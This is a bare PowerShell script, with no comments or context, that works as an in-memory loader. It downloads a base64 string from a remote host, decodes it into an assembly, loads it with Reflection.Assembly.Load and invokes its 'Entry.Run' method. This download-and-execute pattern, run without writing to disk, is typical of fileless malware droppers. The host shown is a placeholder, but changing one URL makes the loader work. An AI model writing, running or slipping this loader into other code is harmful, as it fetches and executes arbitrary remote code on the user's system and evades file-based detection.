$web = New-Object Net.WebClient
$text = $web.DownloadString('https://staging.invalid/blob')
$chars = ($text.ToCharArray())[0..($text.Length - 1)]
$bytes = [Convert]::FromBase64String(-join $chars)
$module = [Reflection.Assembly]::Load($bytes)
$method = $module.GetType('Entry').GetMethod('Run')
$method.Invoke($null, $null)
